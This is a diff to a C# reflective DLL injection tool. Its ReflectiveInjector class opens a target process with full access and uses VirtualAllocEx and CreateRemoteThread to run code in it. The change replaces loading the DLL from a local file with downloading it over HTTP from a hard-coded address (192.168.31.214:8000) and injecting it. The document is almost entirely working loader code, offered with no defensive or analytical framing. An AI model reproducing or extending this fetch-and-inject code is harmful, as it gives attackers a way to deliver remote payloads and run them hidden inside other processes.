@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
@@ -316,13 +317,7 @@ public class PeParser
 public class ReflectiveInjector
 {
     [DllImport("kernel32.dll", SetLastError = true)]
-    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CloseHandle(IntPtr hObject);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -332,6 +327,10 @@ public class ReflectiveInjector
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
 
     public static bool Inject(string processName)
     {
@@ -347,7 +346,8 @@ public class ReflectiveInjector
         IntPtr hProcess = OpenProcess(0x1F0FFF, false, processes[0].Id);
 
         // 加载DLL到内存
-        byte[] dllBytes = File.ReadAllBytes("D:\\files\\projects\\ReflectiveDLL\\x64\\Release\\ReflectiveDLL.dll");
+        byte[] DownloadFile(string url) => new System.Net.WebClient().DownloadData(url);
+        byte[] dllBytes = DownloadFile("http://192.168.31.214:8000/ReflectiveDLL.dll");
 
         PeParser peParser = new(dllBytes);
 
